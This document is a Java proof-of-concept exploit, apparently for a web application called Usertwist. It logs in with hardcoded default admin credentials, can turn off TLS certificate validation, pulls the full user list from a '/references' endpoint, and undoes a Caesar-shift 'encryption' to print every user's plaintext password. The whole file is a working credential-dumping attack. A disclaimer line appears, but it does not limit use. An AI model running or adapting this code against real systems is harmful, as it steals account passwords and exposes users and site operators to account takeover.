package fr.motysten.usertwist.exploit;

import fr.motysten.usertwist.exploit.tools.Cesar;
import fr.motysten.usertwist.exploit.tools.SSLBypass;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLException;
import javax.net.ssl.SSLHandshakeException;
import javax.net.ssl.TrustManager;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

public class Main {

    public static String link = "https://poc.athelas.fr";
    public static String username = "admin";
    public static String password = "AdminSecret1C";
    public static String port = "443";

    public static void main(String[] args) throws IOException, InterruptedException, NoSuchAlgorithmException, KeyManagementException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

        SSLContext customContext = SSLContext.getInstance("TLS");
        customContext.init(null, new TrustManager[]{new SSLBypass()}, new SecureRandom());

        System.out.println("Usertwist exploit by Motysten");
        System.out.println("Please don't use for unethical purpose !\n");
        String readLine;

        System.out.println("Please enter the URL to attack (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {link = readLine;}

        System.out.println("Please enter the port of the remote web server (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {port = readLine;}

        System.out.println("Please enter the used username (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {username = readLine;}

        System.out.println("Please enter the password (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {password = readLine;}

        HttpClient client = HttpClient.newHttpClient();

        JSONObject requestJSON = new JSONObject();
        requestJSON.put("username", username);
        requestJSON.put("password", password);

        System.out.println("Gathering Bearer token...");

        HttpResponse<String> response = null;
        HttpRequest request;

        boolean tokenFound = false;
        while (!tokenFound) {
            try {
                request = HttpRequest.newBuilder(URI.create(link + ":" + port + "/login"))
                        .POST(HttpRequest.BodyPublishers.ofString(requestJSON.toString()))
                        .build();

                response = client.send(request, HttpResponse.BodyHandlers.ofString());
                tokenFound = true;
            } catch (SSLHandshakeException e) {
                System.err.println("Remote server certificate issuer couldn't be verified. Someone could be spying on your network.");
                System.err.println("Would you like to continue anyway ? [y/N]");
                if (!reader.readLine().equalsIgnoreCase("y")) {
                    System.err.println("Operation aborted ! Security failure.");
                    System.exit(1);
                } else {
                    client = HttpClient.newBuilder().sslContext(customContext).build();
                }
            } catch (SSLException e) {
                if (e.getMessage().contains("plaintext connection?")) {
                    System.err.println("Looks like you're trying to send an HTTPS request on HTTP port. Would you like to switch on port 443 ? [Y/n]");
                    if (reader.readLine().equalsIgnoreCase("n")) {
                        System.err.println("Operation aborted !");
                        System.exit(1);
                    } else {
                        port = "443";
                    }
                }
            }
        }

        if (response.statusCode() == 401) {
            System.err.println("Invalid credentials ! Please try again (defaults credentials could help)");
            System.exit(1);
        }

        JSONObject responseObject = new JSONObject(response.body());
        String token = responseObject.optString("token");

        System.out.println("Token found: " + token);

        requestJSON = new JSONObject();
        requestJSON.put("term", "");
        requestJSON.put("entity", "users");

        System.out.println("\nScanning for existing users...");

        request = HttpRequest.newBuilder(URI.create(link + ":" + port + "/references"))
                .POST(HttpRequest.BodyPublishers.ofString(requestJSON.toString()))
                .setHeader("Authorization", "Bearer " + token)
                .build();

        response = client.send(request, HttpResponse.BodyHandlers.ofString());
        JSONArray usersArray = new JSONArray(response.body());

        System.out.println(usersArray.length() + " users found !");
        System.out.println("\nDecrypting passwords...\n");

        for (int i = 0; i < usersArray.length(); i++) {
            JSONObject user = usersArray.getJSONObject(i);
            String login = user.getString("username");
            String password = Cesar.cesarRotate(user.getString("data"), -4);

            System.out.println((i + 1) + ". " + login + " => " + password);
        }
    }

}
